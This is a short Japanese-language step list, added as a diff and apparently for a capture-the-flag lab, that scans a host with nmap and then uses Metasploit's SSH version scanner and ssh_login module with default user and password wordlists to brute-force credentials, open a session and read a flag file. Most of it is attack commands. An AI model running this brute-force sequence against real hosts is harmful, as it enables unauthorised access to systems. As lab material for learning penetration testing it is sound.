@@ -1,0 +1,21 @@
+demo : sshログイン
+1) pingでホストが稼働しているかを確認する
+2) nmapでホストのセキュリティホールを探索する
+3) msfconsoleを起動する
+4) 以下のコマンドで、SSHでバージョンを確認する
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS
+exploit
+5) 以下のコマンドを使って、クレデンシャルを得る
+use auxiliary/scanner/ssh/ssh__login
+set RHOSTS
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+set STOP_ON_SUCCESS true
+set VERBOSE true
+exploit
+6) フラグを見つける
+sessions 
+sessions -i 1
+find / -name "flag"
+cat /flag
